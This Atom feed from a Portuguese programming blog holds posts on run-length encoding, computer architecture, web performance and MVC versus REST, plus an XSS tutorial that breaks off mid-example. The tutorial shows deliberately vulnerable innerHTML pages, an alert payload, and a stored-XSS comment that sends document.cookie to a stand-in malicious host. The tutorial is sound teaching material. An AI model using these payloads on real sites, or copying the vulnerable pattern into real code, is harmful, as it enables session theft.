<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-04T07:13:29-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ItaloCobainsBlog</title><subtitle>Bem-vindo ao nosso blog, um espaço dedicado à exploração do fascinante mundo da programação, tecnologia, hacking ético e ciência da computação. Mergulhe conosco em uma jornada repleta de insights e novidades, enquanto compartilhamos nosso conhecimento e paixão por esses campos em constante evolução.</subtitle><entry><title type="html">Como funciona a compressão de dados</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados.html" rel="alternate" type="text/html" title="Como funciona a compressão de dados" /><published>2023-05-04T05:10:00-03:00</published><updated>2023-05-04T05:10:00-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados.html"><![CDATA[<p>Olá! Nesse post, vamos explorar os conceitos de compressão de dados, na faculdades de ciencia da computação estudamos que em computadores tudo é um grande “LINGUISÃO DE BITS” que apenas é traduzido por tabelação para caractere, tendo isso em mente vamos entender como funciona o pensamento sobre compressão de dados.</p>

<h1 id="1-o-que-é-a-compressão-de-dados">1. O que é a compressão de dados</h1>

<p>Comprimir é o ato de torna algo menor (espremer) ou (remover). Existem muitos tipo de compressão de dados, aquelas que perdem dados e não tem como reculperar e aquelas que perdem e tem como reculperar.</p>

<h1 id="vamos-para-a-implementação">Vamos para a implementação</h1>

<p>Criei um diretorio <em>teste</em> no meu wsl ubuntu 22 para fazer esse teste.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir teste
cd teste
</code></pre></div></div>

<p>Vou criar um arquivo de texto chamado <em>t.txt</em></p>

<p><em>t.txt</em></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa b c d e   f
</code></pre></div></div>

<p>vamo rodar um xxd nesse arquivo</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>italo@italo:~/teste<span class="nv">$ </span>xxd <span class="nt">-b</span> t.txt
00000000: 01100001 01100001 01100001 00100000 01100010 00100000  aaa b
00000006: 01100011 00100000 01100100 00100000 01100101 00100000  c d e
0000000c: 00100000 00100000 01100110 00001010
</code></pre></div></div>

<p>Aqui vemos que os primeiros 3 bytes se repetem no endereço offset 00000000 <code class="language-plaintext highlighter-rouge">01100001 01100001 01100001</code> eu sei que ja ta na cara do porque esse byte repete mais vamos ser um pouco mais hardcore e vamos fingir que não sabemos. Para descobrir vou criar um script python para isso.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">binario</span> <span class="o">=</span> <span class="s">'01100001'</span>
<span class="n">decimal</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binario</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
<span class="n">ascii_char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">decimal</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">ascii_char</span><span class="p">)</span>
</code></pre></div></div>

<p>Agora temos a total certeza que <code class="language-plaintext highlighter-rouge">01100001</code> e igual a <code class="language-plaintext highlighter-rouge">a</code> em ascii, sabendo disso se entra o conceito mais basico de compressão sem perda de dados. Se nos conseguirmos passar simplificar esse dado para apenas um trecho que represente 3 dele vamos ter um arquivo menor correto ? Sim
embora não seja gritante a diferença, esse é o algoritmo de (RLE) Run Length Encoding. Vamos implementa-lo em python agora.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">compress</span><span class="p">(</span><span class="n">file_path</span><span class="p">):</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="nb">file</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
    
    <span class="n">compressed_data</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]:</span>
            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">compressed_data</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">count</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span>
            <span class="n">count</span> <span class="o">=</span> <span class="mi">1</span>
            
    <span class="n">compressed_data</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">count</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>

    <span class="k">return</span> <span class="n">compressed_data</span>


<span class="k">def</span> <span class="nf">decompress</span><span class="p">(</span><span class="n">compressed_data</span><span class="p">,</span> <span class="n">output_file_path</span><span class="p">):</span>
    <span class="n">decompressed_data</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">count</span><span class="p">,</span> <span class="n">byte</span> <span class="ow">in</span> <span class="n">compressed_data</span><span class="p">:</span>
        <span class="n">decompressed_data</span><span class="p">.</span><span class="n">extend</span><span class="p">([</span><span class="n">byte</span><span class="p">]</span> <span class="o">*</span> <span class="n">count</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file_path</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">output_file</span><span class="p">:</span>
        <span class="n">output_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">decompressed_data</span><span class="p">))</span>

        
        
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">input_file_path</span> <span class="o">=</span> <span class="s">'t.txt'</span>
    <span class="n">compressed_file_path</span> <span class="o">=</span> <span class="s">'t_des.txt'</span>

    <span class="n">compressed_data</span> <span class="o">=</span> <span class="n">compress</span><span class="p">(</span><span class="n">input_file_path</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Dados comprimidos: </span><span class="si">{</span><span class="n">compressed_data</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

    <span class="n">decompress</span><span class="p">(</span><span class="n">compressed_data</span><span class="p">,</span> <span class="n">compressed_file_path</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Arquivo descomprimido salvo em: </span><span class="si">{</span><span class="n">compressed_file_path</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>

</code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>italo@italo:~/teste<span class="nv">$ </span>python3 main.py
Dados comprimidos: <span class="o">[(</span>3, 97<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 98<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 99<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 100<span class="o">)</span>, <span class="o">(</span>1, 32<span class="o">)</span>, <span class="o">(</span>1, 101<span class="o">)</span>, <span class="o">(</span>3, 32<span class="o">)</span>, <span class="o">(</span>1, 102<span class="o">)</span>, <span class="o">(</span>1, 10<span class="o">)]</span>
Arquivo descomprimido salvo em: t_des.txt
</code></pre></div></div>
<p>Note a saida, vemos que isso e um array de tuplas sendo o primeiro indice a quantidade de repetição e o segundo o decimal em ascii. E parabens vc fez seu primeiro algoritmo de compressão de dados.</p>]]></content><author><name></name></author><category term="programação" /><category term="algoritmos" /><category term="logica" /><category term="dados" /><summary type="html"><![CDATA[Olá! Nesse post, vamos explorar os conceitos de compressão de dados, na faculdades de ciencia da computação estudamos que em computadores tudo é um grande “LINGUISÃO DE BITS” que apenas é traduzido por tabelação para caractere, tendo isso em mente vamos entender como funciona o pensamento sobre compressão de dados.]]></summary></entry><entry><title type="html">Introdução à Arquitetura de Computadores: Conceitos e Componentes Fundamentais</title><link href="http://localhost:4000/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores.html" rel="alternate" type="text/html" title="Introdução à Arquitetura de Computadores: Conceitos e Componentes Fundamentais" /><published>2023-05-03T10:10:00-03:00</published><updated>2023-05-03T10:10:00-03:00</updated><id>http://localhost:4000/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores</id><content type="html" xml:base="http://localhost:4000/arquitetura/computadores/hardware/sistemas/2023/05/03/Arquitetura-de-computadores.html"><![CDATA[<p>Olá! Neste post, vamos explorar os conceitos fundamentais da arquitetura de computadores, abordando os principais componentes e suas funções. A arquitetura de computadores é um tema essencial para quem deseja aprofundar seus conhecimentos em ciência da computação e entender como os sistemas computacionais funcionam por trás dos bastidores.</p>

<h2 id="1-cpu-unidade-central-de-processamento">1. CPU (Unidade Central de Processamento)</h2>

<p>A CPU é o cérebro do computador, responsável por executar instruções e realizar cálculos. As CPUs modernas são compostas por vários núcleos, permitindo a execução simultânea de múltiplas tarefas. Além disso, cada núcleo possui um conjunto de registradores e uma unidade de controle que gerencia a execução das instruções.</p>

<h2 id="2-memória">2. Memória</h2>

<p>A memória é um componente crucial do sistema, pois armazena dados e instruções que serão processados pela CPU. Existem diferentes tipos de memória, como:</p>

<ul>
  <li>RAM (Memória de Acesso Aleatório): É uma memória volátil, ou seja, perde os dados quando o computador é desligado. É utilizada para armazenar dados e instruções temporariamente enquanto o sistema está em funcionamento.</li>
  <li>ROM (Memória Somente de Leitura): É uma memória não volátil, que armazena informações permanentes, como o firmware do sistema.</li>
  <li>Cache: É uma pequena quantidade de memória de alta velocidade que armazena temporariamente os dados mais frequentemente acessados pela CPU para agilizar o processo de leitura e escrita.</li>
</ul>

<h2 id="3-barramento">3. Barramento</h2>

<p>O barramento é um conjunto de linhas de comunicação que conectam os componentes do sistema, como a CPU, a memória e os dispositivos de entrada e saída. Existem diferentes tipos de barramentos, como o barramento de dados, o barramento de endereços e o barramento de controle, cada um com funções específicas no processo de comunicação entre os componentes.</p>

<h2 id="4-dispositivos-de-entrada-e-saída">4. Dispositivos de entrada e saída</h2>

<p>Os dispositivos de entrada e saída permitem a interação entre o usuário e o sistema. Alguns exemplos de dispositivos de entrada incluem teclado, mouse e câmera. Já os dispositivos de saída incluem monitor, impressora e alto-falantes.</p>

<h2 id="conclusão">Conclusão</h2>

<p>A arquitetura de computadores é um campo fascinante que nos ajuda a compreender o funcionamento dos sistemas computacionais e a forma como seus componentes interagem. Ao estudar arquitetura de computadores, você se tornará mais apto a solucionar problemas, otimizar a performance de sistemas e desenvolver soluções mais eficientes e eficazes.</p>

<p>Aprofundar-se nesse tema também abrirá caminho para explorar áreas relacionadas, como arquiteturas paralelas, sistemas distribuídos e design de hardware. Portanto, invista tempo e esforço no estudo da arquitetura de</p>]]></content><author><name></name></author><category term="Arquitetura" /><category term="Computadores" /><category term="Hardware" /><category term="Sistemas" /><summary type="html"><![CDATA[Olá! Neste post, vamos explorar os conceitos fundamentais da arquitetura de computadores, abordando os principais componentes e suas funções. A arquitetura de computadores é um tema essencial para quem deseja aprofundar seus conhecimentos em ciência da computação e entender como os sistemas computacionais funcionam por trás dos bastidores.]]></summary></entry><entry><title type="html">Melhore a Performance da sua Web em Nível Escalável: Técnicas Criativas e Avançadas</title><link href="http://localhost:4000/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web.html" rel="alternate" type="text/html" title="Melhore a Performance da sua Web em Nível Escalável: Técnicas Criativas e Avançadas" /><published>2023-05-03T10:00:00-03:00</published><updated>2023-05-03T10:00:00-03:00</updated><id>http://localhost:4000/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web</id><content type="html" xml:base="http://localhost:4000/desenvolvimento/web/performance/otimiza%C3%A7%C3%A3o/escalabilidade/2023/05/03/Melhore-a-Performance-da-sua-Web.html"><![CDATA[<p>Olá! Neste post, vamos explorar técnicas criativas e avançadas para melhorar a performance de aplicações web, focando em soluções escaláveis que se adaptam a diferentes tamanhos de projetos e demandas. Vamos abordar estratégias para otimizar o carregamento de recursos, aperfeiçoar o tempo de resposta do servidor e proporcionar uma experiência de usuário mais ágil e agradável.</p>

<h2 id="1-priorizar-o-carregamento-de-recursos">1. Priorizar o carregamento de recursos</h2>

<p>O carregamento de recursos é um dos principais fatores que afetam a performance das aplicações web. Para melhorar a velocidade de carregamento, é importante priorizar o carregamento dos recursos críticos, ou seja, aqueles necessários para a renderização inicial da página. Algumas técnicas para priorizar o carregamento de recursos incluem:</p>

<ul>
  <li>Utilizar o atributo <code class="language-plaintext highlighter-rouge">&lt;link rel="preload"&gt;</code> para informar ao navegador quais recursos devem ser baixados com prioridade.</li>
  <li>Carregar CSS crítico inline no <code class="language-plaintext highlighter-rouge">&lt;head&gt;</code> do documento.</li>
  <li>Carregar o JavaScript não crítico de forma assíncrona ou diferida.</li>
</ul>

<h2 id="2-adotar-uma-arquitetura-baseada-em-microserviços">2. Adotar uma arquitetura baseada em microserviços</h2>

<p>Em vez de construir uma aplicação monolítica, considere adotar uma arquitetura baseada em microserviços. Nesse modelo, a aplicação é dividida em pequenos serviços independentes que se comunicam entre si. Essa abordagem permite escalar individualmente cada serviço conforme a demanda, melhorando a performance geral da aplicação.</p>

<p>Além disso, os microserviços podem ser desenvolvidos, testados e implantados de forma independente, o que facilita a manutenção e a evolução da aplicação.</p>
<h2 id="3-utilizar-técnicas-de-cache-avançadas">3. Utilizar técnicas de cache avançadas</h2>

<p>O uso eficiente do cache pode melhorar significativamente a performance da sua aplicação web. Algumas técnicas avançadas de cache incluem:</p>

<ul>
  <li>Cache distribuído: Utilize um cache distribuído, como o <a href="https://redis.io/">Redis</a> ou <a href="https://memcached.org/">Memcached</a>, para armazenar dados compartilhados entre várias instâncias da sua aplicação.</li>
  <li>Cache de fragmentos: Em vez de armazenar em cache páginas inteiras, armazene em cache apenas fragmentos de conteúdo que são comuns entre várias páginas.</li>
  <li>Cache com versionamento: Adicione um identificador de versão aos nomes dos arquivos estáticos, como CSS e JavaScript, para garantir que os navegadores sempre carreguem a versão mais recente dos recursos.</li>
</ul>

<h2 id="4-implementar-service-workers">4. Implementar Service Workers</h2>

<p>Os Service Workers são scripts executados em segundo plano no navegador, permitindo funcionalidades como notificações push, sincronização em segundo plano e, principalmente, cache avançado. Ao utilizar Service Workers, você pode armazenar em cache recursos estáticos e dinâmicos, melhorando a performance da sua aplicação web mesmo em condições de conexão instável ou offline.</p>

<p>Você pode aprender mais sobre Service Workers e como implementá-los em sua aplicação consultando a <a href="https://developers.google.com/web/fundamentals/primers/service-workers">documentação oficial do Google</a>.</p>

<h2 id="5-otimizar-a-entrega-de-imagens">5. Otimizar a entrega de imagens</h2>

<p>Imagens são frequentemente os recursos mais pesados em uma aplicação web. Otimizar a entrega de imagens pode melhorar significativamente a performance do seu site. Algumas dicas para otimizar a entrega de imagens incluem:</p>

<ul>
  <li>Utilizar formatos de imagem modernos, como WebP ou AVIF, que oferecem melhor compressão sem perda de qualidade.</li>
  <li>Implementar carregamento progressivo ou responsivo para carregar imagens de acordo com a resolução e o tamanho da tela do dispositivo do usuário.</li>
  <li>Comprimir imagens usando ferramentas como <a href="https://imageoptim.com/">ImageOptim</a> ou <a href="https://tinypng.com/">TinyPNG</a>.</li>
</ul>

<h2 id="conclusão">Conclusão</h2>

<p>Melhorar a performance da sua aplicação web em nível escalável é um processo contínuo que envolve várias técnicas e abordagens criativas. Ao focar na otimização do carregamento de recursos, adotar arquiteturas escaláveis, utilizar técnicas avançadas de cache e otimizar a entrega de imagens, você estará no caminho certo para criar uma aplicação web rápida e eficiente.</p>

<p>Lembre-se de monitorar a performance da sua aplicação regularmente e ajustar as estratégias conforme necessário. Dessa forma, você garantirá que seus usuários desfrutem de uma experiência agradável e rápida, independentemente do tamanho e das demandas do seu projeto.</p>]]></content><author><name></name></author><category term="Desenvolvimento" /><category term="Web" /><category term="Performance" /><category term="Otimização" /><category term="Escalabilidade" /><summary type="html"><![CDATA[Olá! Neste post, vamos explorar técnicas criativas e avançadas para melhorar a performance de aplicações web, focando em soluções escaláveis que se adaptam a diferentes tamanhos de projetos e demandas. Vamos abordar estratégias para otimizar o carregamento de recursos, aperfeiçoar o tempo de resposta do servidor e proporcionar uma experiência de usuário mais ágil e agradável.]]></summary></entry><entry><title type="html">Entendendo as Diferenças entre MVC e RESTful: Conceitos e Aplicações</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful.html" rel="alternate" type="text/html" title="Entendendo as Diferenças entre MVC e RESTful: Conceitos e Aplicações" /><published>2023-05-03T06:00:08-03:00</published><updated>2023-05-03T06:00:08-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/arquitetura/mvc/restful/2023/05/03/Entendendo-as-Diferen%C3%A7as-entre-MVC-e-RESTful.html"><![CDATA[<p>Olá! Neste post, vamos discutir as diferenças entre os conceitos de <strong>Model-View-Controller (MVC)</strong> e <strong>RESTful</strong>. Ambos são importantes em desenvolvimento de software, especialmente no contexto de aplicações web, mas têm propósitos e funcionalidades diferentes. Vamos aprender sobre cada um deles e como eles são aplicados na prática.</p>

<h2 id="o-que-é-mvc">O que é MVC?</h2>

<p>O Model-View-Controller (MVC) é um padrão de arquitetura de software que separa a lógica de negócio, a apresentação e o controle das aplicações em três componentes distintos:</p>

<ol>
  <li><strong>Model</strong>: Representa os dados e a lógica de negócio da aplicação. É responsável por armazenar, processar e manipular os dados.</li>
  <li><strong>View</strong>: É a camada de apresentação responsável por exibir os dados ao usuário. As views recebem informações do model e as apresentam de forma visual.</li>
  <li><strong>Controller</strong>: Gerencia a comunicação entre a Model e a View. Ele recebe entradas do usuário através da View, processa as solicitações e atualiza o Model e a View de acordo.</li>
</ol>

<p>O objetivo principal do padrão MVC é separar as responsabilidades e facilitar a manutenção e escalabilidade do projeto.</p>

<h2 id="o-que-é-restful">O que é RESTful?</h2>

<p>RESTful é um conjunto de princípios e práticas para a construção de aplicações web que seguem os princípios da arquitetura REST (Representational State Transfer). As aplicações RESTful são projetadas para funcionar bem com a web, aproveitando os protocolos e convenções existentes, como HTTP e URL.</p>

<p>As principais características das aplicações RESTful incluem:</p>

<ol>
  <li><strong>Protocolo cliente-servidor</strong>: Separação das responsabilidades entre o cliente (interface do usuário) e o servidor (lógica de negócio e armazenamento de dados), permitindo que ambos evoluam de forma independente.</li>
  <li><strong>Stateless</strong>: Cada requisição do cliente para o servidor deve conter todas as informações necessárias para entender e processar a solicitação. O servidor não deve armazenar informações sobre o estado do cliente entre as solicitações.</li>
  <li><strong>Cacheable</strong>: As respostas do servidor podem ser armazenadas em cache no cliente para melhorar o desempenho e a eficiência.</li>
  <li><strong>Sistema em camadas</strong>: A arquitetura pode ser composta por várias camadas hierárquicas, com cada camada tendo uma responsabilidade específica.</li>
</ol>

<p>RESTful é frequentemente usado para criar APIs (Application Programming Interfaces) que expõem funcionalidades e dados de aplicações web de maneira padronizada e fácil de usar.</p>

<h2 id="diferenças-entre-mvc-e-restful">Diferenças entre MVC e RESTful</h2>

<p>Embora tanto o MVC quanto o RESTful sejam importantes no desenvolvimento de aplicações web, eles têm propósitos diferentes e não devem ser confundidos. Aqui estão algumas das principais diferenças:</p>

<ol>
  <li>
    <p><strong>Propósito</strong>: O MVC é um padrão de arquitetura de software que ajuda a organizar e estruturar a lógica de negócio, a apresentação e o controle da aplicação. Por outro lado, RESTful é uma abordagem para a construção de aplicações web que seguem os princípios da arquitetura REST, focando principalmente na comunicação entre cliente e servidor e na organização das APIs.</p>
  </li>
  <li>
    <p><strong>Componentes</strong>: O MVC é composto por três componentes principais: Model, View e Controller. Já as aplicações RESTful não têm uma estrutura de componentes específica; em vez disso, seguem um conjunto de princípios e práticas para a construção de aplicações web.</p>
  </li>
  <li>
    <p><strong>Aplicação</strong>: O MVC é geralmente usado no desenvolvimento de aplicações web, onde a separação de responsabilidades entre os componentes pode ajudar a simplificar e organizar o código. Por outro lado, RESTful é aplicado principalmente na construção de APIs que expõem funcionalidades e dados de aplicações web de maneira padronizada e fácil de usar.</p>
  </li>
  <li>
    <p><strong>Comunicação</strong>: O MVC lida com a comunicação entre os componentes internos da aplicação (Model, View e Controller), enquanto o RESTful foca na comunicação entre cliente e servidor através de protocolos e convenções da web, como HTTP e URL.</p>
  </li>
</ol>

<h2 id="conclusão">Conclusão</h2>

<p>MVC e RESTful são conceitos importantes no desenvolvimento de aplicações web, mas servem a propósitos diferentes e têm diferentes áreas de aplicação. O MVC é um padrão de arquitetura que ajuda a organizar o código e facilita a manutenção e escalabilidade do projeto, enquanto RESTful é uma abordagem para a construção de aplicações web e APIs que seguem os princípios da arquitetura REST.</p>

<p>Entender a diferença entre esses dois conceitos e saber como aplicá-los em seus projetos é fundamental para criar aplicações web eficientes e bem estruturadas.</p>]]></content><author><name></name></author><category term="Programação" /><category term="Arquitetura" /><category term="MVC" /><category term="RESTful" /><summary type="html"><![CDATA[Olá! Neste post, vamos discutir as diferenças entre os conceitos de Model-View-Controller (MVC) e RESTful. Ambos são importantes em desenvolvimento de software, especialmente no contexto de aplicações web, mas têm propósitos e funcionalidades diferentes. Vamos aprender sobre cada um deles e como eles são aplicados na prática.]]></summary></entry><entry><title type="html">Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos</title><link href="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site-Scripting).html" rel="alternate" type="text/html" title="Entendendo o XSS (Cross-Site Scripting): Conceitos e Exemplos" /><published>2023-05-02T23:48:46-03:00</published><updated>2023-05-02T23:48:46-03:00</updated><id>http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site%20Scripting)</id><content type="html" xml:base="http://localhost:4000/seguran%C3%A7a/programa%C3%A7%C3%A3o/vulnerabilidades/xss/2023/05/02/Entendendo-o-XSS-(Cross-Site-Scripting).html"><![CDATA[<p>Olá! Neste post, vamos discutir o conceito de <strong>Cross-Site Scripting (XSS)</strong> e ver alguns exemplos que ilustram essa vulnerabilidade comum em aplicações web. Vamos aprender sobre as causas desse problema, como explorá-lo e como evitá-lo.</p>

<h2 id="o-que-é-xss">O que é XSS?</h2>

<p>Cross-Site Scripting (XSS) é uma vulnerabilidade de segurança que permite que um atacante injete código malicioso, geralmente scripts JavaScript, em páginas web visualizadas por outros usuários. Esses scripts podem acessar informações confidenciais, como cookies e tokens de sessão, ou até mesmo executar ações em nome da vítima.</p>

<h2 id="tipos-de-xss">Tipos de XSS</h2>

<p>Existem três tipos principais de XSS:</p>

<ol>
  <li><strong>XSS Persistente (Stored XSS)</strong>: Ocorre quando o código malicioso é armazenado permanentemente em um servidor, geralmente em bancos de dados ou arquivos. Quando outros usuários acessam a página afetada, o script é executado em seus navegadores.</li>
  <li><strong>XSS Refletido (Reflected XSS)</strong>: Ocorre quando o código malicioso é injetado por meio de parâmetros GET ou POST e é imediatamente refletido na resposta do servidor. Geralmente, o atacante induz a vítima a clicar em um link malicioso que contém o código.</li>
  <li><strong>XSS Baseado em DOM (DOM-Based XSS)</strong>: Ocorre quando o código malicioso é injetado no Document Object Model (DOM) de uma página sem a necessidade de interação com o servidor. Esse tipo de XSS explora falhas no código JavaScript do lado do cliente.</li>
</ol>

<h2 id="exemplo-de-xss-refletido">Exemplo de XSS Refletido</h2>

<p>Vamos considerar um exemplo simples de XSS Refletido:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Exemplo de XSS Refletido<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Resultado da Pesquisa:<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">let</span> <span class="nx">searchQuery</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">q</span><span class="dl">'</span><span class="p">);</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Você pesquisou: </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">searchQuery</span><span class="p">;</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Neste exemplo, o script JavaScript insere o valor do parâmetro <code class="language-plaintext highlighter-rouge">q</code> diretamente no elemento HTML. Se um atacante criar um link como <code class="language-plaintext highlighter-rouge">https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, o script malicioso será executado no navegador do usuário.</p>

<h2 id="exemplo-de-xss-persistente">Exemplo de XSS Persistente</h2>

<p>Suponha que temos um fórum onde os usuários podem postar comentários. Um exemplo de XSS Persistente pode ocorrer se o aplicativo não sanitizar corretamente as entradas dos usuários antes de armazená-las no banco de dados. Um atacante pode enviar um comentário contendo um script malicioso, como:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Olá</span><span class="p">,</span> <span class="nx">pessoal</span><span class="o">!</span> <span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">http://malicious.example.com/steal?cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Quando outros usuários visualizarem esse comentário, o script malicioso será executado em seus navegadores, podendo roubar seus cookies e enviá-los para o site malicioso.</p>

<h2 id="exemplo-de-xss-baseado-em-dom">Exemplo de XSS Baseado em DOM</h2>

<p>Considere o seguinte exemplo de uma página que usa o DOM para exibir o resultado de uma pesquisa:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Exemplo de XSS Baseado em DOM<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Resultado da Pesquisa:<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"result"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">let</span> <span class="nx">searchQuery</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">Você pesquisou: </span><span class="dl">'</span> <span class="o">+</span> <span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nx">searchQuery</span><span class="p">);</span>
    <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

